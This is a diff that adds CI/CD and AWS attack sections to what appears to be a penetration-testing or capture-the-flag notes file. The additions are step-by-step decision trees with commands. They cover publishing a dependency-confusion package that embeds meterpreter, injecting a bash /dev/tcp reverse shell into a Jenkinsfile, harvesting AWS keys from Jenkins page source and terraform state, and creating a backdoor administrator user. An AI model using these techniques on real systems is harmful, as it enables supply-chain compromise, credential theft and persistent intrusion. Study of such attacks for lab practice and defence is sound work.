@@ -164,3 +164,159 @@ aws iam get-account-authorization-details --filter User Group LocalManagedPolicy
         └── may see more than the original credentials could see
         └── look for additional privesc paths from the role's perspective
 ```
+
+---
+
+## CI/CD Attack Vectors
+
+#CICD #DependencyConfusion #Jenkins #PoisonedPipeline #Terraform
+
+### I see a private package registry (PyPI, npm, RubyGems)
+
+```
+OSINT: search forums, issue trackers, job postings for internal package names + versions
+        └── found "hackshort_util v1.1.3" → internal package name confirmed
+
+Can you publish to the registry?
+    YES → Dependency Chain Abuse (CICD-SEC-3)
+        → Build malicious package at version N+1
+        → Embed meterpreter in utils.py / index.js / main.rb
+        → Publish with twine/npm publish/gem push
+        → Wait up to 10-15 min for production rebuild cycle
+        → Catch meterpreter session
+    NO → Look for package source in SCM (Gitea/GitHub) and poison the source instead
+```
+
+### I have a meterpreter session in a container — no nmap
+
+```
+Upload netscan.py via meterpreter:
+        upload /local/path/netscan.py /netscan.py
+
+Run from shell:
+        python3 /netscan.py 172.18.0.1/24
+        python3 /netscan.py 172.30.0.1/24
+        └── look for :80 (web), :8080 (Jenkins/app), :443
+
+Found :8080 on internal IP?
+        └── curl http://172.x.x.x:8080/login → Jenkins login page?
+                └── shows "Create an account" → self-registration enabled
+                        → Set up SOCKS proxy tunnel → browse internally
+                        → Create account → enumerate projects + plugins
+```
+
+### I'm browsing Jenkins internally via SOCKS tunnel
+
+```
+Check installed plugins (Manage Jenkins → Plugins → Installed):
+        └── S3 Explorer?
+                → Navigate to a project using it
+                → View Page Source (Ctrl+U)
+                → Search "awsid" → plaintext AWS keys in hidden inputs
+                → Configure stolen-s3 profile → enumerate S3 buckets
+
+Check all project Jenkinsfiles for:
+        └── Hardcoded credentials, environment variable refs, secret blocks
+        └── Pipeline steps that could be PPE targets
+
+Found a build project you can trigger?
+        └── Can you edit the Jenkinsfile? → PPE (Poisoned Pipeline Execution)
+        └── Can you push code to the upstream repo? → Indirect PPE
+```
+
+### I have S3 credentials — what do I look for?
+
+```
+aws s3api list-buckets --profile <stolen>
+        └── bucket names with "tf", "terraform", "state" → gold mine
+
+Download terraform.tfstate
+        └── grep -A20 '"index_key"' → per-user IAM key blocks
+        └── grep "AdministratorAccess" → find the admin user
+        └── Extract id + secret → configure new profile → sts get-caller-identity
+                → AdministratorAccess confirmed?
+                        → ec2 describe-instances → check Tags for flags
+                        → iam get-account-authorization-details → full audit
+                        → enumerate everything
+```
+
+### Container has no sqlite3 binary
+
+```
+python3 -c "
+import sqlite3
+c = sqlite3.connect('<path/to/db.db>')
+print([t[0] for t in c.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")])
+print(c.execute('SELECT * FROM <table>').fetchall())
+"
+```
+
+---
+
+## Scenario 1: Leaked Secrets to Poisoned Pipeline
+
+#PoisonedPipeline #GitLeaks #Jenkins #IAM
+
+### I found an S3 bucket name in the page source
+
+```
+curl https://<bucket>.s3.us-east-1.amazonaws.com
+    └── AccessDenied → bucket ACL blocks public, but try AWS CLI
+
+aws s3 ls <bucket-name>   (using any valid AWS account)
+    └── SUCCESS = AuthenticatedUsers ACL misconfiguration
+            → aws s3 sync s3://<bucket> ./local/
+            → Check for: .git/ directory, Jenkinsfile, scripts/, source code
+
+Found .git/ directory in the bucket?
+    └── git log  →  look for "Fix issue", "Remove creds", "Oops", "WIP"
+    └── git show <suspicious_commit>
+            → diff shows removed hardcoded Authorization: Basic header?
+                    → base64 --decode → username:password
+                    → try on SCM server (Gitea, GitHub, GitLab)
+```
+
+### I have credentials for the SCM server
+
+```
+Browse private repos → look for Jenkinsfile / .gitlab-ci.yml / .github/workflows/
+        └── Jenkinsfile found with withAWS(credentials:'aws_key') block?
+                → Pipeline loads AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY as env vars
+                → Check webhook settings (Settings → Webhooks): Push event → Jenkins URL?
+
+Can you edit the Jenkinsfile?
+    YES → Poisoned Pipeline Execution (PPE)
+        → Add sh 'bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1" &' inside withAWS block
+        → Commit → webhook fires → Jenkins builds → reverse shell with AWS env vars
+    NO → Can you fork and submit a PR? → Indirect PPE (PR triggers pipeline)
+```
+
+### I have a reverse shell on the Jenkins builder
+
+```
+env | grep AWS
+    └── AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY present?
+            → aws configure --profile=CompromisedJenkins with these values
+            → sts get-caller-identity → get username
+
+iam list-user-policies + list-attached-user-policies + list-groups-for-user
+        └── Any inline policy with Action: "*", Resource: "*"?
+                → FULL ADMIN
+                → Create backdoor user with AdministratorAccess
+                → Create access key for backdoor user
+                → ec2 describe-instances → check Tags for flags/assets
+```
+
+### I need to check if a container is privileged
+
+```
+cat /proc/1/status | grep Cap
+        └── CapPrm all F's (0000003fffffffff)?
+                → capsh --decode=0000003fffffffff → shows all capabilities
+                → cap_sys_admin + cap_net_admin = privileged container
+                → but still need root in container to exploit escape
+
+cat /proc/mounts | head -3
+        └── overlay on / type overlay = Docker
+        └── Look for additional mounts → secrets from host?
+```
